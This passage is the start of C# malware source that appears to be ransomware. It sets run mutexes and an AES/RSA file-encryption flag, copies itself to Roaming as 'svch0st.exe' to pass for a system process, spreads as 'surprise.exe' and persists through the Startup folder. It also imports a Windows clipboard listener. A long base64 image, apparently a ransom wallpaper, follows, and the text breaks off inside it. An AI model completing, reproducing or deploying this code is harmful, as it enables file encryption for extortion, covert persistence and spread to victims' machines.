using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svch0st.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEAAQABAAD/2wBDAAIBAQEBAQIBAQECAgICAgQDAgICAgUEBAMEBgUGBgYFBgYGBwkIBgcJBwYGCAsICQoKCgoKBggLDAsKDAkKCgr/2wBDAQICAgICAgUDAwUKBwYHCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgr/wAARCAFUAlgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD+f+iiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigApQueKSuj+EOkab4g+Kfh3Q9XtxLa3es28NxEf40aQAj8qyrVY0KMqstopv7tTHE1o4bDzrS2im/uVznQhNIeK+o/+CjP/AAT81v8AZF1618a6NdwXPhbXrllsfLOGtnxuETA8n5e/tXy6eTxXnZHnmW8R5XTx+BnzU57PzWjT7NPRnk8N8R5RxZk1LM8tqc9Kps+zWjTXRp6NABnvRt9D3r2f9in9jH4g/tk/EGTw14Qmtrex00xy6veXMmBHEzdh1Y4B49qzv21Phz4a+En7SfiT4c+EbIQWGlXIghRSf4Rgnn1rOGf5ZVz2WUU53rxhzyS+yrpK/m73S7fIyp8UZPW4llkVKpzYiEPaTivsRvFLm7OXNdLsr9jykrjmjYc4Jr2L9mz9kL4pfG6yl+Jll4Qu7jwfod7GfEF9AAWWEEGTy1JBkIXJwK/RrR/Bv/BHFdItFabwgT9nXmeTDnj+IHkH618txT4i5dw3iVQp4epiZ6qSopS5GrO0+zad0n0Pi+M/FfKuEcXHDUsLVxk7tTVBKfs2rNKpZ+62ndJ621PyDC570EY61+t3jvwN/wAEgL3wXqtppMnhf7VJYyJbHT2Lz+YVIXy1XktnGAO9fnD+0R+y18T/AIBtZeIPFHhC/sdE1su+j3N3EFZ0BxhlBO09Dg9jWvCviBgOJ6sqUqFTDTvaMay5XPRt8murSV2uhtwV4pZXxjXlQnhquEqXtCNeKg6mjb5NfecUrtLZanl4Ge9GB617f/wT3+C/hH9oP9pTTfhN41g3WWqWN0m7GfLcQsVf8CM1R/bY/ZO8Ufsg/Gi6+HOuTxXFpPH9p0i7ibiW3YkLkdQQQQR7V9F/rFli4h/sWUrV+RVEn9qN2nbzVtV8z6r/AFsyZcVPh6c7Yn2aqpP7UG2nZ9WmtV21PHaXacZpK+rf+Ce3/BPTxJ+0gZPjF4tgt18F6SJzcq8vz3UiISIwo5xnHPtWme57lvDmWzx2Omowj97fSK7t9Eb8S8S5RwllE8yzKooU4/fKT2jFdZS2SPlMgjrSVp+M7e2s/FeoWdnCI4oryRI0HZQxArMr1oTVSCkuup7dOaqU1NdVcKKKKosKAM96Bjua+rP+Cav7H/g79r/SfHvhHW1SLVLLT4ZNFvnziGUiQc47ZA/KvHz7O8Fw5lVTMMZf2cLc1uiclG/yvd+R4PE3EeXcJ5LUzXHtqjT5eZpXspSUb+ivd+R8qbeM5pK6X4ufC7xR8F/iJq3wy8Z26R6jpF48FwI3DKSDjII7Guar06FeliaMatKXNGSTTWzT1TXqexhsRQxmHhXoyUoTScWtU01dNeTQu05xmjYfWvsT4B/8E8dSsf2YfE37TPxg0y3No+kxN4bsvNyzb2U+c2OB8pwAfU18r+B/DUPi74gaZ4SeXyU1DVY7Yy4zsDuFzj8a8XLeJMqzario4WfMsO+Wclqr2u0u9tn56HzuU8X5JndbGwwdTnjhZcs5LWPNy8zS78uz89DE2e9Jj3r9Tfhn+zL+yP8AszxQfC79sb4eaOrzxCfQvGM8X+j38bYJjcgfI6k9D1B612//AAhv/BG/r5vgz/v8K/OcT4yYGlVaoZfiK0PszpxUoSXdNP709U9Grn5Pi/H/AC2jXaw2VYqvTfw1KUFOE13i0/vTs07ppNH497eM5oxiv1k8ceCP+CcXiFE8B/s6fB/R/F/ivWEaHTYtLi3Q2rnjzJnxhFH3ufSvzs/a4+Bcf7O/xbuPh1/aKXUsEe6d402qr7iCB7DFfUcKcfYPijEPDvD1KFS3Mo1ElJxWjdk7pX0u7Xe17M+z4J8TsBxli3hXhauGq25owqpKUorRy5U20k9E5Wu72vZnl22gjHevtH9nr/gn7pf7Tn7A+ofEvwNZwQ+MdJ1OZkllcgXUKDJj9AcdD6ivjPULS40+9lsLqPZJDIySL6EHBr38n4jyzO8VisNh5fvMPNwnF7p9H6Po/Jn0+Q8WZRxFjMZhMLL97hajp1IvdPo/8Muj8n2IaXbx1qfSNLvtb1ODSNMg8y4uZVjgjBxuYnAHNfX/AMU/2CLb9nf9hBvil8SdPgk8WaxPHPatE+77HAzIFQnoSQST9arN+IcsyWvh6GIl+8rzUIRW7b6+i6srPuK8o4exOFw2Kn+9xNSNOnFbtvd2/lju38tz452+/wClGKu+HNPj1fXbPS5ZCi3FykZbGcZYCv1g8Ffs5fsRfB3w1p3hb9pn4SaXYTpZRm28U3MOLTUFKggl8fLJ1yp9D1rxuL+NsJwhGkqlGdadS9o07OVo2u0m1e11otetrHgceeImB4EjQVTD1K86vNaFOzlaNrtJtXtdaK762tc/JIqRRt96/YT/AIQ//gjeOPM8F/8Af4Vw/wC0J4i/4JIfB/4a3fi7wl4K8OeI9Ux5en6XpuHaSQ9C3ZVHUmvj8J4wLG4mGHpZRiuaTSV4JK77tuyXmz4LBePSzDF08NRyLGuc2kr00ld922kl3b0R+WYXOfakrZ8eeItL8VeL9Q8Q6LoMWl2t3dNJb6fB92BCeEHA6VjV+xU5SnTUpKza1Xby+R++UpTnSjKceVtK67PtppoFFFFWaABk4pdp9aQdea+mf+Cav7NmnfHz4h6hqd9o1rq40BUn/sO8Hy36kMWjyeASF4z3NeVneb4XIcrq4/EfBTV3+SXZXb3ei6nicR59guGclrZni/4dNXf3pJa6K7aV3ot3ofM+30owD0P6V+wSeB/+CSNoPsvivwx4c0PUI/lu9M1VPKmgkHVWBHY8ZHFO/wCEN/4I34x5ngz/AL/Cvyf/AIjTQ/6FOK+ULr70z8Q/4mFw3TI8a/Smmvk07P5H4949KNpxmvqv9sn9kfRde1/V/jV+x74SutR+HVmFjuLy2iIjjmCkuYwx3OgAGWxjJxXyq4IOPev1bI87wWfYGOIw+j05oP44Nq/LNfZkuzP2zhziLL+Jstji8M7Oy5oSsp05NX5Jx3jJdUxNvGSaSv0p/Yv/AGbP2evCn7PHh74g/tA/B211rRNcie5fxQYgf7P+cqUmHUKCAQwz1PTFet/8Id/wRu/56+DP+/wr82zHxfwOBx9XDUsBXrKEnHmpxUo3i7PZ3Tv0dmfkmbePOXZbmVbCUcsxOIVOUoc9KKnFuLs1o7ppraVn5WPx8AzRjjNfrp4r0z/gjd4W8M3viNrPwpdiyt2lFtaNvllIHCqo6knivzQ/af8AiT8L/ih8UbjxD8IPhzD4Y0JYlitNOiAycZy5x3NfR8Jcc1OLMROEMvrUYRWs6iUVfolrdv0Vl1Pq+BvEirxxipwp5XiMPTgtZ1YqMb9IpXu2/JWXU86KYGc0bPevpD/gmj8CrD42/GHUP7Q8KW2vx6HpL3raFdYC3i7lUopPAb5sjPcdq+8bfwF/wSgsIRY/EDwT4d8N6xCduoaNquI57aQdVI7+oI4INcXFHiVguGs0eBWEq15xSb9mlJq+qvG97W62t0vc8/jPxey/hDOnlqwVbEziouXsUpOPNqrxvzWt9q3L0vc/H2lA4zX7CDwb/wAEbz0l8F9f+ewr5L/4KG/Fb9gzSNHu/hL+zD8K9Om1NmjM3ia0jHlRDIJVCeWPbI9TXLkHidPiHM4YOhleIjfeU4qMYrq22+nZavojj4Y8Y58U5vTwGHyXFwct5zgowir6yk29l2Wr6I+LwuehoxV3QPD+s+KdbtvD3h+wkur27mWK3giGWd2OABX33+xr+y7+yv8AAu51Hw7+3bo8OneIpIFa3t9di22xTOSYpASrnBXPcZr63ifinA8MYP2tSEqtTdU4K85K6TajvZX1fQ+54x41y7g7AOtVhKtUesaVNc1SSuk2o78sbq72R+e1KFyetfsJ/wAId/wRu/56+C/+/wAK+dP20/2Rfgd8edYtB/wT38O22q3ek2bzeI4dH4t0iyNhLkgbyc4Uc4Br43J/FrLsyx8aGIwVfDwd71KseWEf8Um7K+y82j8/yDxyyrOMzhhsVl2IwtN3vVrQUKce3NJuyu9E31aXU+BSMHFFWdX0rUND1S40bVrR7e6tZmiuIJBho3U4II9QarV+sRkpRTWzP3CMozipRd0wooopjCiiigAoooFAChc0Va0RbZtXtlvceSZ1Euem3PNFcuIxSw8knFu/Y4cVjVhZJODlfsipRRRXUdwUUUUAFFFFABRRRQAV1fwK/wCS0eFf+w/a/wDo1a5Ucmus+BWT8aPCoVR/yH7X/wBGrXHmP/Ivrf4ZfkzgzX/kV1/8Ev8A0ln6Wf8ABeZiP2d/Big/8x0f+iWr8pq/Vj/guCW8X/CDwd4P8Lo1/qUeqefJa2qlykYiIJOOnJFfmcPg38Tv+hK1D/wGb/CvyXwRr0MN4fUI1ZKL56js2lpzPXU/Dvo6YnD4Twtw8K01FudV2bSdnN2ep91f8G/pP/Cd+Ox2Nja5/OSvmL/gpLn/AIbT8dH/AKiz19Qf8EO4bj4Z/Erxbp/jy2k0uXUrK3FkLuMoJSC+cE8dx+dfMH/BSQf8ZpeOSDwdWbFYZBaXjZmdSOsZUKdn0duRaM5eGPf+kRnFWOsZYalZ9Hb2adn110P0C/4I8QxN/wAE/wDW8xKd2oX+8FR837pevrX5LeIQi6/fLjH+lydP941+pv8AwS7+J3gj4U/8E4Ne8TeO9disrSLUb4FmOWOY1AwOp5Nflfrc8d5rF1dQHKS3Dsh9QWJFbeG1GvHjXiOrKL5XWik7aNrnuk/K6+9G/hHh8RDxD4rrSi1CWIgk7aNrnuk+trq/a6Oh+BipJ8ZvC0bqCp1+1yCMg/vVr9Lf+C6qRj9mvwa5QbhqiBTjkDyhX5kfCbW9O8N/E3w/r2rymO1s9Yt57iQDO1FkUk4+gr9Fv+Cw3xV8B/GP9kTwb4v+HXiCLUbA6wsZlj4wwj5BB5FPjrD4iXiTw/WUXyKVRN2dk2tE3td9CvEnC4qXi5wviIwbpxnVTlZ8qbWib2TdtF1Pmb/gkB/yfV4W/wCuN3/6IevTP+C9TH/hpbw8CeP+EYj/APRsleaf8Efxn9uvwsT08i7ySf8Apg9d9/wXV8R6Frn7UWk2Ok6nHcS2Ph2OK6WM58t/MkOCfXBFY46E5eO+FaWiwrv5e9M58yhOf0l8G0rpYKV/L3prU+Ia/XX/AII5n/jAzXPa9vP/AEWa/Iqv1h/4I3eNPDE37GniDwXHrEX9pxz3kjWZbD7fL6j1rfx1p1KnBC5U3atTb8ld6nT9JSlUq+HS5It2r0m7dFd6vyPy08df8jlqn/X/ADf+hmsmtbx1x4y1Qf8AT/N/6Gaya/X8P/Ah6L8j95wv+7Q9F+QUUUVsbhX6I/8ABv7/AMj546/68bX+clfndX6H/wDBASaK28bePbmeUJHHp9sXdjgAZk61+Z+MWvhxj/SP/pcT8e8fE34S5ml/LD/05A+ZP+Ck5Lftp+OiT/zFmrwwdR9a+gf27PDWv/Ev9rPxt4o8D6Ld6hYS6xIIrqC3Yo2CQcHHPSvJP+FOfE4cnwVqHH/Ts3+FfS8L4nDUeG8FTqTSkqVNNNpNPlW6Pr+Dcbg8Pwjl9KrUjGSo0k02k0+SOjXQ/WW4Of8AgkvBnn/il7Tqf9yvyj+CpJ+OPhoH/oY7b/0ctfqTpXjHw34j/wCCU8+k6PqSyXWmaBawX9uQQ8Mg2AqVPNflv8E8f8Ly8MjA/wCRktuv/XZa/LfCqE6WBz2M1Z+3qb/4T8Y8FKdSjl3EkZpp/WKuj03jdfgfpR/wXWjQ/s2+DHKDcNUQBscgeUK/KjoMla/Vr/gr9DcfG/wN4U+BvwttZNX8SW0qXlzZWwyIodgUFm6DJ7V8FH/gn9+1n1/4VJd/9/k/xrq8G80y3KuBKNHG1o0pOU2lOSi+Vy0dm1o+jOzwBznKMk8NMPQzDEQozc6klGcoxbi5uzSk07Po+p9I/wDBCGGCT4veIJXhUukEWxiMleH6HtXjn/BVv/k7nWfq3/oxq9y/4Jb+G/EX7IPxmmtf2gNDudCHiERRaZNKm+N3G5cMy528kDmvDf8AgquUk/a31eRGDK4ZlIPBG9qnJ5xxPjRicVSfNSnQjyyWsXaydmtHZ72FkFSOL+kHjMZRfNRqYaPJNO8ZcvKnyyWjs9HbZn3B/wAEdDj9gzXSO15ef+izX5QeOv8AkctUP/T/ADf+hmv1U/4JIa7pHhv/AIJ9eItY16/jtbWG7vTLNK2AB5Zr8p/GNzDd+KtRubeTfG97KUYdwXNa+G8J/wCvfEcrae1ir/8AgRr4SU5rxL4sm1p7eCv0v7+hofCIkfFHw+Qf+YtB/wChiv1L/wCCqpJ/YH0dif8Alwtf5x1+V/wxvrXTfiJomoX0wjhh1OF5XP8ACocZNfqH/wAFNfEGieKf+Cemiaz4f1GK6tnsbULLGcjIaMEe1LxIpzfHPD87O3tbX6X00F4t0qj8SOF6nK+X2zV+l9NLn5aeBv8AkcdL/wCv+L/0MV+r3/BY6C3f9hLQJpI1Lre2e1iOR+7r8o/A3PjPShjrfw/+hiv1P/4KfeI7D4yfAfQ/2afhokureL1a0uJNOtkyEjEWSWf7o496fiPCa46yCr9mE5yk+kYrku2+iXVvQrxbhUXiRwvWS9ynUqTnLpGC5Lyk9lFdW9D8myo7UnUfSvZz/wAE/v2s8nHwju/+/wAn+Ncr8U/2Zfjd8F9Mg1j4jeBLnTraeTZHM5DAt6ZUnH41+rUM/wAjxVZUqOKpyk9kpxbfokz9rw3E/DeNrxoYfGUpzltGNSLb9Enc4GindOozTa9Y90KKKKACvvn/AIIPnHxa8Rf9cIf5PXwOOTX3j/wQ31TT9B+IvivXNWukgtbSzjknmdgAihZCTX514sRlLw+x6Su3Ff8ApUT8o8cIyn4WZlGKu3BW/wDA4nkP/BVWCCH9rnW/KjVN7OzbVxk+Y3NfNq4PHoa+u/2zvg18UP2r/j5rPxO+B3gm81bRDO0Ud6VEYc72OQGIJGD1ryr/AId+/taAAH4R3fBz/ro/8a6OE87yfL+GsJhsViYQqQpxUoynFSTts03dM6uCOI8gyzhDA4TGYunTqwpQUoynFSi0ldNN3T8mfo3+xfbW3/Dpa8X7OmG0DUCw2dTlua/IK84uJB2Ehx+dfqr+zx8aPh/8JP8AgmNrfgL4g6sdN1fS7W8027sJ4/3i3Eis6KB3BB69K/Km4ZZJnkHRnJB/GvlfCnD4innOe1ZxajPEtxfRrV3T6qzTuu6PifBLC4qlxBxLWqQahUxbcW1pJe87xezVmnddGj9gPhbDDN/wRouElRXA8E35AYZ5zLX49Hqa/WbwP8T/AAZ4b/4JRaR8N9S1TOueJfC95aaNp0KF5LiV3dVGB0GWHJr8/wD/AId//tZt8w+Et3z/ANNU/wAa8/wux2DynFZzLHVI0lUxVRx52o8yTabjdq6T0bXU8zwZzHAZHjc/lmNaNFVcbVcHUkocyUmm48zV0no2up40DxSuc16j4z/Yv/aT+H3hm48XeK/hnd22n2q5nn3q20fQEmvLsEfKQRz6V+2YPMMDmNNzwtWNRLS8WpJPtof0PgM0y3NabqYKtGrFOzcJKST7NpvU+6f+CCn/ACct4h/7FeT/ANGx15h/wV7iij/bq8ViKJVzHaltoxk+QnNeif8ABDTXNJ8L/HvxV4j169S2s7PwlLLcTyHAVRLHk1jft3fBb4oftZ/tPeJPjB8CPBt3rPh25eGC31AARrI0cSq2AxBxkHmvxmjWpYHxsxmLxMlCksNGLnJ2jzNwaV3ZXaTaR/P1DEUct+kRj8di5qnQWEhFzk1GHM3BqPM7K7SbSveyZ8dA4o46ZzXsy/8ABPz9rXI2/CO75HTzk/xry3xl4K8T/D7xFc+FPF+kS2V/aSFJ4JV5Uj371+wYPN8qzGo4YWvCo1raMk3b0TZ+94DPskzWo6eCxNOrJK7UJxk0u9k2enfsDxRS/tY+C1ljDj+3bfhxn/loK+xf+C/8ECnwJMsKBybkFgvOPl718ffsBjH7WXgv5gMa5bnJ/wCugr6V/wCC5Hxy+GfxI8WeHfA/gzxCt7qPh+a4j1WONDtiY7cDd0PQ9K/KOIcNia3jLlU6cW4wpVHJpOyTUlr21svU/D+KcLi8R9IDJKlKDlGFGq5NJ2impJN9k20tep8BV+of/BAeGEeAPH8nlrua6twWxyRtk4r8vK/SH/gg98VvAug23jD4baxrsdvq+pPFPZW8vHmoocNg9MjIr0vGqjWr+HWLjSi204N210U4tv0S1Z7P0hsPiMR4UY2NGLk06bdlfRVItvTolq+x8Q/tZqiftN+PEjUKo8V3wAUYA/fNXnleiftbAj9p3x6Dj/ka73p/12avO6/Q8l/5E+G/69w/9JR+qcPf8iDCf9eqf/pCCiiivTPYCiiigAo+tFA60AOBxyDRToIZLiZbeIbndtqj3oqZThF+80jOdWlTdpNIjoooqjQKKKKACiiigAooooAOnIqfT9SvtKvodT026eG4t5FkhmjbDIwOQQexBqCik0pKzFKKkrNXR91/sN/8FUvBHwd0u/034/eC21S6mw0WswW4muJj3EjOfx4r7J8Pft4eGvFvwxb4z+H/ANmTxFc+GVtpLg6omnQbPKjzvbBbOBg9u1fiZu9ulfsN+yqxH/BHe4weng7VcfnNX82eLXBfDGUOhmdOg3PEVoU5LnkopNO7ik9Hp6eR/Injl4e8G5FLDZxTwzdTFYinSkvaTjBKSd3FRas9F5eR4l+1Z/wV++Cfj3wE3h/4UfCdJNSlDr9q1awRfspIwHQqchs9/avz48U+KvEHjbX5/E3ijV572+un3T3NzIXdj7k9aoXBxcSf75/nTATnj8a/auFuDci4Qwro5dBq+7k3KXpd9PJH9D8F8AcNcCYN0Mqptc2rlKTlL0u9l5K3mfa/7N/7BOtftPfsJ3Xjrwb42v4NV03UroLpU1+y2cwQK33Om4jPP0r4su7aWzuZLScYeKQo49wcV+uv/BHjn9gDWf8AsI3/AP6KWvyT8R8eIb7r/wAfcnb/AGjXynAOe5lmHFGeYGvK9OhWXJpqlLmur9VorHxHhjxLm2a8ZcR5ZiZ81LDV17PTVKfNdX6r3Va+2ovhnw/f+K/ENl4a0pQbnULtLe3DHA3uwUZ/E19XftcfsNeI/wBkr9kXQdS8d+LLm61nVdf3SWEF6z2cKGPghDxv9TXzf8CePjP4V5/5mC1/9GrX6W/8F1s/8M1eDjn/AJiif+iqvjDP8ywXHGS5ZRklSrTk56avlWiv0WupfH3FGb5d4jcPZNQklRxE5ynpq+RaK/Ra6nwp/wAE+/h94q+KP7Sum+CPBfjW88P6le2V0trqljMY3iIhY43AEgEDBx61mftn/s8/F79nT4zXnhf4xX0t7e3gN1a6lLdGY3cTMQH3HnOQeteif8EgeP26vC3p5N3/AOiHr0z/AIL0k/8ADS3h8Z/5liP/ANGyUV8/x2H8XKWUxUfZVcPzPRcycZStaW9vJ3QYnifMsJ460ckgoujWwnO7xXMnGU7WlvbTZ3XbU+E6+pf+Cfv7HH7RfxZu2+L/AIE8Q3nh7w5YLcLeazaX/lu22M5jVQcnPTkY618tV+u3/BHMD/hgzXP+vy8/9Fmt/FjiHHcN8JSxGFUXKc403zK6Sle7ttfte68jq8b+Ksx4S4GlisFGLnUnCk+dcySndNpbX7XuvI/JzxlEYPFOoQNM0hS7kUyP1YhiMmsytbx2c+MtU5/5f5v/AEM1k1+jUHehH0X5H6xhm3hoN9l+QUUUVqbhX1p/wS/+CvxJ+MzeNLD4a+N7rTLmzs4JJdNiujFDqSnf+6lI5KnGOo6mvkuv0R/4N/sHx546B/58bb+clfAeKOPr5XwLjMVRtzQUWrq6+OO6f9dj8v8AGbM8Tk3htj8bh7c8FBrmSa/iQ3T/AK6rU9bk/wCCpX7Nf7Om34OeO/gpd6RrWhIttqljZafCYkmUYbYdxyM5wc803/h9x+yCeP8AhXWq/wDgti/xr4J/4KTZP7aXjrn/AJizV4YOo+tfEZT4NcFZzldDH141OerCM5WqO15JN2vd2u+5+dZH9H/w8z/JcNmeJhV9pXhCpK1WVuacVJ2vd2u9Ltn6gftC+GvEXx7+E+u/tEfD3whJ4B8Ito6ODZ7YJ9bLuCPNjUlSoByCQDk1+cvwq0yHWPi1oOjz3M0a3OuwRPLA5V1BlAyCOQfev1mn3f8ADpiAn/oWLT/2Svyi+Cp/4vl4ZIPP/CR23/o5a28LMbUq5RmlFK0aFSVOG7fLGOl27tvzb8lZaHR4L5hVrZFnWHilGGGqzpw3b5YQsnKTblJ9W2/JWVkfpp8U/HPib/glva/8JQNHh8TeG/EZhFpqmo4m1FJwmSkkhILJjGOTjmuD/wCH8VueD8MI/wDwHH/xddl/wXV/5Np8Hf8AYVT/ANFV+U/bg9K8Tw74K4a474Zhm2cUOevKUouSbV+V8qbSdr2Wtj5vwp8O+EfErg+nnmfYZVMTKU4ykm48yg+VNpO17LVq1z9Tvhz+2t8QP+Ciwuvg/wCAPhto1rGxjXUtR1O2XNrExyWjyT8+AcHHBxXxH/wUI+HVj8LP2hb3wdY63qGoJaxbDc6ncmWRiHYfePbivob/AIIPZPxa8Rc/8sIf5PXjf/BVs4/a51nA7t/6MavU4UwuF4f8UMRkeXwVPDwpKVldtyko3bbv8uh7fBGBwfC3jLiuHMrpqnhadBTUVdtyko3cm227bK1kkek/8E3fhn4K/a0+EWt/s0+JfidrmlXsLy3tnpthfmOCZQBguvRvmPp2r5v/AGuP2aPFP7KfxjvPhZ4ndZTHEs1rco2VmibowP1BH4Vuf8E9/jPdfAz9rDwl4uTm2n1FbK9QtgGKb92T+G7P4V9z/wDBb79mZ/H/AII0P9ojwxGzXWlRG31BFXO+3IMitx/d+b8678TnWM4R8UaeCr1P9jx0XKKaXu1dnZ762W/8y7HpYziHMOBfGell2Iq/7BmUXKKaVo19nZrXWy3v8S7H51fs1/ArxL+0b8ZNH+E/hSF2n1Gf97KvSGIDLOT2AFfTX/BQT4ReHP2MPg9on7OGl/EvV9W1HVla91PTri9L29uu8bWReAuSp7dq9D/4Ia/AdNJ1XxB+0p4m8yG3tNMNtYtImEZWbLuCfTZj8a+YP+Ck3xzl+PP7WniPxJFIGstPlGn6ft6COLjPvltx/Gup5vjuJvFB5bRn/smCgpzsviqv4U3/AHb3suqZ2PPcx4v8ZXlFCf8AsOXwU6lkverv4U219nmvZdYs8Z8GxJc+KtPt3kdVkvI0LRthgCwGQexr9S/GniX4gf8ABNTwwvxHi8Maf4i8I6osIttWvUEuqLLIisUlkJBZQQQOTgYr8tfAzkeMdL/6/wCL/wBDFfrB/wAFjOP2DdCx/wA/ln/6LFcXidKOK4nybK68VOhiZThOL6r3LNNWaa6euxweMk4YzjDIMlxMFPDYuc4VIu+qvBppppqS6PzejPMR/wAF4bYH/kmEf/gOP/i64H9pn/gsIvxx+EmofDmy+Fum+bfYXzdQ09JFjXuygk4b0OK+FzgEHPf1oLEr1H0r6HB+EfAeAxUMTRwtpQaa96W626n1OA8C/DPLcbTxdDB2nTkpRfNLdarqPuZjc3DzlApds7UGAPwqKlDY7UlfpWx+upJKyCiiigYo619af8EtfgNF8etf8UaFF4kvrC9t7RHsEguSkE8uHKrOvR0JABBB4Jr5KHFffP8AwQgOPi34i94Icfk9fB+JuMxOX8DYzEUJWnGKaf8A28j8z8Ycfi8r8OMwxeGly1IRTT/7fj3PSPHH/BVXxb+yxq6/Br4g/CPTIdR0qIQy/wBl2yiF9vy7lAbgcegrGH/BeG2PH/CsY8f9ew/+Lr5t/wCCrOf+GutZOD1bH/fxq+a1B6574r5Dh7ws4HzvI8Pj8ThV7SrBSlaUkrtXdlc+E4W8F/DfiLhzC5ni8Eva1oRnK0pJc0ld2V3ZXP0C+PXwD+LH7f8A8EtS/bN0yzsNHjhQta6TbMIhcWsKsXllAzuk3ZAJPQV+f0iGNijHlTgj0r9g/wBi/j/gkvdgD/mX9R4/Fq/H67J+1SZPSQ/zr0PC3NcRiK+Z5Y0lRwlb2dNJbQV0k312PU8GM7xWLxOc5O0lQwNd0qKS+GCukm+u2/e5+ln7N3ww+IHwQ/Zk8Lftc+BLLTdf0+y0Sa612w8QKJpbVI2f/j0Lf6sYBJAIzVY/8F4rbP8AyTGP/wABh/8AF1698Ks/8Oarjv8A8UTf/wDtWvx6PU/Wvj+EeGck4/zHM6mdUVUlQrzpxabT5btpOzs7dHbY+D4F4P4c8T81zmrxDh1VnhsTUpQkm4vk5pNKVnZ22Tte3c/RTxj/AMFyovEHhXUdEg+FVnJJdWckcaXVmGjLEEDcC3Ir4C8ceK5/HPie68T3OmWdk90+5rawtliiT/dVQAKyAMjIoJwen51+w8N8F8OcJ87yyjyOdr6t7ep+9cJeHvCfA7qPJ8P7N1Lczu3e3qz6i/4JdfAq4+PnxI8TeFNN1yazvrbw811YL5uLeeVZE2xzryHjOeVINfTvjf8A4KfeL/2M9cP7PPxF+FejrqugwpHO2j2irbuGUMrIAwxkEdhXlf8AwQVYt+0v4gJP/Mryf+jY68y/4K/H/jOzxVnp5Nr/AOiEr8vzPLsDxZ4rYjJM0pqpQhRjVitmpe6tGmtGnqn1PxnOcqy7jjxtxXDuc0lVw0MPGtFapxn7sdGmtGm7p31Poj/h/FbDp8MY/wDwGH/xdfK37bv7bNx+1v4oGpx+BNJ0y3RU23EOnoly5A53ScsR7ZrwLbxnIpTuAxnoeBX3+ReG3B/DmPWNwOH5aiVk7t2v8z9R4b8I+AuE8zWYZbheSqk0nzSdr+TZ6h+xz4Rs/Hn7Q/hrwle6neWcWoanFA9zYzmOWMM4GVYcg12n/BQL9ibx7+yR8QTc+IdYGo6Trd5M+kXslz5k0iA5/eZ53cjNc/8AsBA/8NZeCwf+g7b/APowV9jf8HAPEfgPnq1z3/3a8XOOIMyy/wAU8BltKS9jXpS5k1/LzNNPo9PuPnM+4ozfLPGrK8poSXsMTRnzpq+seaSafR3XpY/NOvqz/gmD+xFr/wC1J47vPF03im60fQtAUC9u9NvDFctIwO1UI+hzXynX6if8EB/+SdePzkf8fdv/AOgyV6HitnWPyDgbFYvBy5anuxTteylJRdvOz0PV8beIM04Z8